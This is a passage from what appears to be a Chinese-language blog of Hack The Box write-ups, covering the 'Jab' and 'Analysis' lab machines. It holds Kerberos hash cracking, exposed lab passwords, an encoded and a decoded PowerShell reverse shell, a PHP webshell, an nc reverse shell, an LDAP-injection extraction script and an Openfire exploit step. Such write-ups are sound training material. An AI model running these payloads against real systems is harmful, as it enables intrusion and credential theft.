601507465703d2c9561826c5ca7eb336955e8a0cf2098180899b1cdfa22e468f2c6988398f05178eb77a2c69e98b3fdaea7d9ef67ec1b8d92520dc6586d0135485efe9acecde7515a360d133db188c45b452024b26eaef87adea7d05685db7269a0dde5b333234bbfb28d9947c17a4f9e312423d5b08cab53dfb65b14a921e6bfcc4675840e813aa52fe276ee3d51016fb6eee8\n$krb5asrep$23$mlowe@jab.htb@JAB.HTB:96f5be1fe2bfe7c9ac8fef8f6e3a3458$4027248319fc24759fd75c57f2c9f368c5c6c1674473130e9aa19029fe2f36f82e0bf7c63eb1815d196e6764f47dade4760207de13faa4a093c5ac704e3356eba8755080b5bf12726a494243499eb41645344425071658f0c7674c019a0227b2118da090133560f089d0facceb348d644bb762f9dcda40df3201aa7d94a981a5edf2fd3a2daa68bf6972186459e85eacb7755aa994b5ec37b8706eef10bb639fb0bb10d3a1042a3aed71f9cbdadb24880e94d1907c6379559a1472cfd01bafa612659dd0d98b5c1a8c9a30f3f39fca6d38328f9d08d2c3b301c6eb9d7b495d89be3f\n```\n\n都是 hash 值，拿去爆破一下\n\n```\n┌──(root㉿kali)-[~]\n└─# hashcat -m 18200 outputusers.txt /usr/share/wordlists/rockyou.txt\n\n$krb5asrep$23$jmontgomery@jab.htb@JAB.HTB:3ab8a6a20b0f5e8e7971c62e9c2b3e25$477d81abb2ccfd5efc1941eb4edec536833aabb063a9ec2a0e2867232f0177b2ee0c7c8f757ff3e4db1c4c810f4dcd1d2644149393892dedc93ca62630a1ec75debcc1cfa520f181dc117e1a51806bb5657b857d38452eef375f6da8232e14e085dc24adb7686739c323b2615e446370d006512ec576616e0c5ee7038eeecaf6bfe7afdf6836605bf37d159cf92cdf499b116b3890f70ab78106873a03fc03ba998cbff13842e0e9291902151a681a6574cbba8e88344fa154c149e9ef7687c241c092a0f4f5d0cbc5d7affe31f3f1463295305dfb2b921e11ecec48ca40b8ded32d:Midnight_121\n```\n\n爆破出来一个可用的，我们拿去登录 xmpp\n\n```\n02:31 2023年11月22日 星期三\nadunn 02:31 team, we need to finalize post-remediation testing from last quarter's pentest. @bdavis Brian can you please provide us with a status?\nbdavis 02:33 sure. we removed the SPN from the svc_openfire account. I believe this was finding #2. can someone from the security team test this? if not we can send it back to the pentesters to validate.\nbdavis 03:30 here are the commands from the report, can you find someone from the security team who can re-run these to validate?\n03:30 $ GetUserSPNs.py -request -dc-ip 192.168.195.129 jab.htb/hthompson\n \nImpacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation\n \nPassword:\nServicePrincipalName  Name          MemberOf  PasswordLastSet             LastLogon  Delegation \n--------------------  ------------  --------  --------------------------  ---------  ----------\nhttp/xmpp.jab.local   svc_openfire            2023-10-27 15:23:49.811611  <never>               \n \n \n \n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$b1abbb2f4beb2a48e7412ccd26b60e61$864f27ddaaded607ab5efa59544870cece4b6262e20f3bee38408d296ffbf07ceb421188b9b82ac0037ae67b488bb0ef2178a0792d62<SNIP>\n03:30 $ hashcat -m 13100 svc_openfire_tgs /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\n$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&*(1qazxsw\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, TGS-REP\nHash.Target......: $krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openf...91ecc4\nTime.Started.....: Fri Oct 27 15:30:12 2023 (17 secs)\nTime.Estimated...: Fri Oct 27 15:30:29 2023 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   873.9 kH/s (10.16ms) @ Accel:64 Loops:1 Thr:64 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 14344385/14344385 (100.00%)\nRejected.........: 0/14344385 (0.00%)\nRestore.Point....: 14336000/14344385 (99.94%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: $HEX[2321686f74746965] -> $HEX[042a0337c2a156616d6f732103]\n \nStarted: Fri Oct 27 15:30:09 2023\nStopped: Fri Oct 27 15:30:29 2023\nadunn 03:31 I'll pass this along and circle back with the group\nbdavis 03:32 perfect, thanks Angela!\n12:17 2024年2月27日 星期二\n02:22 2023年11月22日 星期三\n02:22 话题为：\n```\n\n在新房间 pentest2003 中找到了用户 svc_openfire 的密码\n\n```\nusername = svc_openfire\npassword = !@#$%^&*(1qazxsw\n```\n\n使用 impacket 的 dcomexec 模块来反弹 shell\n\n```\nnc -nvlp 4444\n```\n\n```\npython3 dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' -silentcommand\n```\n\n```\n┌──(root㉿kali)-[~]\n└─# nc -nvlp 4444                                  \nlistening on [any] 4444 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.11.4] 53495\nwhoami\njab\\svc_openfire\nPS C:\\windows\\system32>\n```\n\n成功获得一个 shell\n\n```\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.16.3\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()%\n```\n\n以上是 poc 没经过 base64 加密的，需要的可以自己修改后加密\n\n```\nPS C:\\users\\svc_openfire\\desktop> type user.txt\n412d61fb3765d0b9b8935ac4141dc5de\n```\n\n# 权限提升\n\n查看一下开放端口\n\n```\nPS C:\\windows\\system32> netstat -anop tcp\n\nActive Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3256\n```\n\n有一个 9090，我们去上传一个 chisel 将它代理出来\n\n> https://github.com/jpillora/chisel/releases/tag/v1.9.1\n\n下载到本地后，先用 python3 开一个 http 服务\n\n```\n┌──(root㉿kali)-[~]\n└─# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n\n```\npowershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3/chisel.exe','C:\\users\\svc_openfire\\desktop\\chisel.exe')\"\n```\n\n然后去运行\n\n```\nkali\n./chisel server --port 9999 --reverse\n```\n\n```\nwindows\n.\\chisel.exe client 10.10.16.3:9999 R:9090:127.0.0.1:9090\n```\n\n然后直接去访问 127.0.0.1:9090 就可以了\n\n![image-20240227134652118](Jab/image-20240227134652118.png)\n\n使用 svc_openfire 的账号密码直接登录即可\n\n> https://github.com/miko550/CVE-2023-32315\n\n下载漏洞的 jar 文件，然后到 plugins 进行上传\n\n![image-20240227135610894](Jab/image-20240227135610894.png)\n\n然后转到选项卡 Server -> Server Setting -> Management Tool 然后输入我们的密码 123\n\n![image-20240227135902733](Jab/image-20240227135902733.png)\n\n这是 system 权限\n\n![image-20240227140149667](Jab/image-20240227140149667.png)\n\n成功拿到 root 权限的 flag 文件\n\n![image-20240227140235437](Jab/image-20240227140235437.png)\n","tags":["Hackthebox"]},{"title":"Analysis - Hackthebox","url":"/2024/01/20/Hackthebox/Hard/Analysis/","content":"\n# 靶场信息\n\n![image-20240219083754512](Analysis/image-20240219083754512.png)\n\n# 信息收集\n\n## Nmap\n\n```\n┌──(root㉿kali)-[~]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.250\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-19 08:41 CST\nWarning: 10.10.11.250 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.250\nHost is up (0.37s latency).\nNot shown: 64232 closed tcp ports (reset), 1277 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-19 00:41:36Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3306/tcp  open  mysql         MySQL (unauthorized)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n33060/tcp open  mysqlx?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, NotesRPC, TLSSessionReq, X11Probe: \n|     Invalid message\"\n|     HY000\n|   LDAPBindReq: \n|     *Parse error unserializing protobuf message\"\n|     HY000\n|   oracle-tns: \n|     Invalid message-frame.\"\n|_    HY000\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49682/tcp open  msrpc         Microsoft Windows RPC\n49792/tcp open  msrpc         Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port33060-TCP:V=7.94SVN%I=7%D=2/19%Time=65D2A3C4%P=x86_64-pc-linux-gnu%\nSF:r(GenericLines,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\nSF:\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HTTPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\"\nSF:)%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSVersionBindReqTCP,9\nSF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestTCP,2B,\"\\x05\\0\\0\\0\\x\nSF:0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20messa\nSF:ge\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TerminalServ\nSF:erCookie,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\nSF:\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20m\nSF:essage\\\"\\x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBP\nSF:rogNeg,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\\nSF:x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\nSF:\"\\x05HY000\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LD\nSF:APBindReq,46,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\x009\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\nSF:'\\x1a\\*Parse\\x20error\\x20unserializing\\x20protobuf\\x20message\\\"\\x05HY00\nSF:0\")%r(SIPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\nSF:\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x\nSF:1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x0\nSF:1\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(JavaRMI,9,\"\\x05\\0\\0\nSF:\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r\nSF:(oracle-tns,32,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0%\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\nSF:'\\x1a\\x16Invalid\\x20message-frame\\.\\\"\\x05HY000\")%r(ms-sql-s,9,\"\\x05\\0\\0\nSF:\\0\\x0b\\x08\\x05\\x1a\\0\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=2/19%OT=53%CT=1%CU=33427%PV=Y%DS=2%DC=T%G=Y%TM=65D2\nOS:A42C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=I%TS=U)\nOS:SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=O%TS=U)SEQ(SP=108%GCD=2%ISR=1\nOS:0D%TI=I%CI=I%II=I%SS=O%TS=U)OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O\nOS:4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFF\nOS:F%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%D\nOS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0\nOS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=\nOS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=\nOS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A\nOS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R\nOS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-02-19T00:43:07\n|_  start_date: N/A\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   343.23 ms 10.10.16.1\n2   173.40 ms 10.10.11.250\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 137.29 seconds\n```\n\n去加一个 hosts 解析\n\n```\necho \"10.10.11.250 analysis.htb\" >> /etc/hosts\n```\n\n然后去访问一下\n\n![image-20240219085021198](Analysis/image-20240219085021198.png)\n\n## Fuzz\n\n是个静态页面，并没有东西，去 fuzz 一下子域名\n\n```\n┌──(root㉿kali)-[~]\n└─# ffuf -u \"http://analysis.htb/\" -H \"Host:FUZZ.analysis.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.5.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://analysis.htb/\n :: Wordlist         : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.analysis.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ninternal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 479ms]\n:: Progress: [4989/4989] :: Job [1/1] :: 24 req/sec :: Duration: [0:02:17] :: Errors: 0 ::\n```\n\n去加一个子域名\n\n```\necho \"10.10.11.250 internal.analysis.htb\" >> /etc/hosts\n```\n\n然后再去访问一下\n\n![image-20240219090813727](Analysis/image-20240219090813727.png)\n\n显示没有权限，那我们直接去 fuzz 一下目录\n\n```\n┌──(root㉿kali)-[~]\n└─# ffuf -u \"http://internal.analysis.htb/employees/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -e .php,.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://internal.analysis.htb/employees/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Extensions       : .php .txt \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 403\n________________________________________________\n\nlogin.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 347ms]\nLogin.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 326ms]\n```\n\n去访问一下\n\n![image-20240219100703527](Analysis/image-20240219100703527.png)\n\n总算有可以访问的了\n\n# 漏洞利用\n\n复制一个用户名字典出来修改一下\n\n```\ncp /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt user.txt\nsed -i \"s|$|@analysis.htb|\" user.txt\n```\n\n下载个kerbrute脚本\n\n> https://github.com/ropnop/kerbrute/releases/\n\n然后去爆破一下\n\n```\n┌─┤(root㉿kali)-[~]\n└─# ./kerbrute userenum -d analysis.htb user.txt --dc analysis.htb\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 02/19/24 - Ronnie Flathers @ropnop\n\n2024/02/19 10:31:58 >  Using KDC(s):\n2024/02/19 10:31:58 >   analysis.htb:88\n\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       cwilliams@analysis.htb\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       jangel@analysis.htb\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       AJohnson@analysis.htb\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       ajohnson@analysis.htb\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       JDoe@analysis.htb\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       technician@analysis.htb\n2024/02/19 10:31:58 >  [+] VALID USERNAME:       wsmith@analysis.htb\n```\n\n将 fuzz 出来的用户名保存起来\n\n访问http://internal.analysis.htb/users/list.php\n\n```\n┌─┤(root㉿kali)-[~]\n└─# curl http://internal.analysis.htb/users/list.php\nmissing parameter\n```\n\n缺少了参数\n\n![image-20240219103558075](Analysis/image-20240219103558075.png)\n\n补上以后，得到了一个用户名和一个表格\n\n猜测应该是 ldap 注入\n\n找到了大佬写的脚本\n\n```\nimport argparse\nimport requests\nimport urllib.parse\n\ndef main():\n    charset_path = \"/usr/share/seclists/Fuzzing/alphanum-case-extra.txt\"\n    base_url = \"http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)\"\n    found_chars = \"\"\n    skip_count = 6\n    add_star = True\n    with open(charset_path, 'r') as file:\n        for char in file:\n            char = char.strip()\n            # URL encode the character\n            char_encoded = urllib.parse.quote(char)\n            # Check if '*' is found and skip the first 6 '*' characters\n            if '*' in char and skip_count > 0:\n                skip_count -= 1\n                continue\n            # Add '*' after encountering it for the first time\n            if '*' in char and add_star:\n                found_chars += char\n                print(f\"[+] Found Password: {found_chars}\")\n                add_star = False\n                continue\n            modified_url = base_url.replace(\"{FUZZ}\", char_encoded).replace(\"{found_char}\", found_chars)\n            response = requests.get(modified_url)\n            if \"technician\" in response.text and response.status_code == 200:\n                found_chars += char\n                print(f\"[+] Found Password: {found_chars}\")\n                file.seek(0, 0)\nif __name__ == \"__main__\":\n    main()\n```\n\n```\n┌──(root㉿kali)-[~]\n└─# python3 poc.py \n[+] Found Password: 9\n[+] Found Password: 97\n[+] Found Password: 97N\n[+] Found Password: 97NT\n[+] Found Password: 97NTt\n[+] Found Password: 97NTtl\n[+] Found Password: 97NTtl*\n[+] Found Password: 97NTtl*4\n[+] Found Password: 97NTtl*4Q\n[+] Found Password: 97NTtl*4QP\n[+] Found Password: 97NTtl*4QP9\n[+] Found Password: 97NTtl*4QP96\n[+] Found Password: 97NTtl*4QP96B\n[+] Found Password: 97NTtl*4QP96Bv\n```\n\n得到了一个密码\n\n```\nusername = technician@analysis.htb\npasswrod = 97NTtl*4QP96Bv\n```\n\n![image-20240219110752538](Analysis/image-20240219110752538.png)\n\n登录成功\n\n前往 SOC Report 上传一个 webshell\n\n```\n<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>\n```\n\n![image-20240219112023588](Analysis/image-20240219112023588.png)\n\n我们之前 fuzz 的时候找到了文件上传的目录，直接访问即可\n\n```\n┌──(root㉿kali)-[~]\n└─# curl http://internal.analysis.htb/dashboard/uploads/web.php?cmd=whoami\n<pre>analysis\\svc_web\n</pre>\n```\n\n现在来反弹个shell\n\n```\nnc -nvlp 4444\n```\n\n然后我们利用上传功能传个nc上去\n\n然后反弹即可\n\n```\nhttp://internal.analysis.htb/dashboard/uploads/web.php?cmd=nc64.exe 10.10.16.10 4444 -e cmd\n```\n\n```\n┌──(root㉿kali)-[~]\n└─# rlwrap nc -nvlp 4444                             \nlistening on [any] 4444 ...\nconnect to [10.10.16.10] from (UNKNOWN) [10.10.11.250] 59341\nMicrosoft Windows [version 10.0.17763.5329]\n(c) 2018 Microsoft Corporation. Tous droits r�serv�s.\n\nC:\\inetpub\\internal\\dashboard\\uploads>whoami\nwhoami\nanalysis\\svc_web\n```\n\n成功获得一个shell\n\n# 权限提升\n\n## WebService\n\n通过到处乱翻，在 `C:\\inetpub\\internal\\users\\list.php` 中找到了一个账号密码\n\n```\n$ldap_password = 'N1G6G46G@G!j';\n$ldap_username = 'webservice@analysis.htb';\n$ldap_connection = ldap_connect(\"analysis.htb\");\n```\n\n我们需要上传一个RunasCs上去提权\n\n```\nwget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip\n```\n\n再准备一个 Invoke-ConPtyShell.ps1\n\n>  https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1\n\n然后再开一个 nc\n\n```\nstty raw 